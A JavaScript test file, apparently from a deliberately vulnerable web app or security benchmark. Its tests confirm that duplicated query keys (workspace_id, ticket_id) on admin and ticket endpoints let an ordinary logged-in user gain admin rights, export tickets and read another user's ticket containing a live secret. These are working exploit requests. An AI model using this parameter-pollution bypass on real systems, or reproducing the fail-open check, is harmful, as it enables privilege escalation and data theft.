const request = require('supertest')
const { newTestApp, registerAndLogin, getOpsLeadTicketId } = require('./helpers')

describe('the fail-open behaviour itself', () => {
  test('a duplicated workspace_id query key on /admin/promote grants the caller admin', async () => {
    const app = newTestApp()
    const cookie = await registerAndLogin(app)

    const res = await request(app)
      .post('/admin/promote?workspace_id=1&workspace_id=1')
      .set('Cookie', cookie)
    expect(res.status).toBe(200)

    const db = app.locals.db
    const user = db.prepare('SELECT id FROM users WHERE email = ?').get('alice@test.local')
    const membership = db.prepare('SELECT role FROM memberships WHERE user_id = ?').get(user.id)
    expect(membership.role).toBe('admin')
  })

  test('any duplicated value (not just matching ones) triggers the bypass', async () => {
    const app = newTestApp()
    const cookie = await registerAndLogin(app)

    const res = await request(app)
      .post('/admin/promote?workspace_id=1&workspace_id=999')
      .set('Cookie', cookie)
    expect(res.status).toBe(200)
  })

  test('a follow-up GET /admin/export confirms the escalation persisted', async () => {
    const app = newTestApp()
    const cookie = await registerAndLogin(app)
    await request(app).post('/admin/promote?workspace_id=1&workspace_id=1').set('Cookie', cookie)

    const res = await request(app).get('/admin/export?workspace_id=1').set('Cookie', cookie)
    expect(res.status).toBe(200)
    expect(res.body.tickets.length).toBeGreaterThan(0)
  })

  test('a duplicated ticket_id query key on /tickets/lookup returns the ops-lead ticket body', async () => {
    const app = newTestApp()
    const cookie = await registerAndLogin(app)
    const opsLeadTicketId = getOpsLeadTicketId(app)

    const res = await request(app)
      .get(`/tickets/lookup?ticket_id=${opsLeadTicketId}&ticket_id=${opsLeadTicketId}`)
      .set('Cookie', cookie)
    expect(res.status).toBe(200)
    expect(res.body.body).toContain('sc_live_')
  })

  test('two different duplicated ticket_id values resolve to the first one via parseInt coercion', async () => {
    const app = newTestApp()
    const cookie = await registerAndLogin(app)
    const opsLeadTicketId = getOpsLeadTicketId(app)

    const created = await request(app)
      .post('/tickets')
      .set('Cookie', cookie)
      .send({ subject: 'mine', body: 'body' })

    const res = await request(app)
      .get(`/tickets/lookup?ticket_id=${opsLeadTicketId}&ticket_id=${created.body.id}`)
      .set('Cookie', cookie)
    expect(res.status).toBe(200)
    expect(res.body.id).toBe(opsLeadTicketId)
  })

  test('the duplicated-key trick does not bypass authentication itself', async () => {
    const app = newTestApp()
    const promoteRes = await request(app).post('/admin/promote?workspace_id=1&workspace_id=1')
    expect(promoteRes.status).toBe(401)

    const opsLeadTicketId = getOpsLeadTicketId(app)
    const lookupRes = await request(app).get(
      `/tickets/lookup?ticket_id=${opsLeadTicketId}&ticket_id=${opsLeadTicketId}`
    )
    expect(lookupRes.status).toBe(401)
  })

  test('the export gate is independently vulnerable to the same trick without ever calling promote', async () => {
    const app = newTestApp()
    const cookie = await registerAndLogin(app)

    const res = await request(app)
      .get('/admin/export?workspace_id=1&workspace_id=1')
      .set('Cookie', cookie)
    expect(res.status).toBe(200)
    expect(Array.isArray(res.body.tickets)).toBe(true)
  })
})
